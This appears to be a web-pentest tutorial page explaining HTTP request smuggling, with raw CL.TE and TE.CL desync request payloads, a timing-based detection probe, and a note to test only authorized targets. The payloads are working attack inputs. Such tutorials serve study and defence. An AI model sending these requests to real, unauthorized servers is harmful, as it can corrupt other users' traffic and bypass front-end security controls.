---
title: "HTTP Request Smuggling Fundamentals"
description: "How CL.TE and TE.CL desync attacks work, and how to spot them."
category: "Web Pentest"
tags: ["request-smuggling", "web", "burp-suite"]
date: "2026-02-20"
---

## Why It Happens

Request smuggling exploits disagreements between a front-end (proxy/load
balancer) and back-end server about where one HTTP request ends and the next
begins. This usually comes down to how each server interprets the
`Content-Length` and `Transfer-Encoding` headers.

## CL.TE Desync

The front-end uses `Content-Length`, the back-end uses `Transfer-Encoding`:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## TE.CL Desync

The front-end uses `Transfer-Encoding`, the back-end uses `Content-Length`:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

## Detecting It Safely

Use a timing-based probe first, so you don't accidentally desync another
user's request in a shared environment:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

If the back-end hangs waiting for more data, that's a strong signal of a
CL.TE mismatch.

## Tooling

- Burp Suite's **HTTP Request Smuggler** extension automates most of the
  detection workflow.
- Always test against a lab or authorized target - smuggling attacks can
  affect *other users'* requests in production.
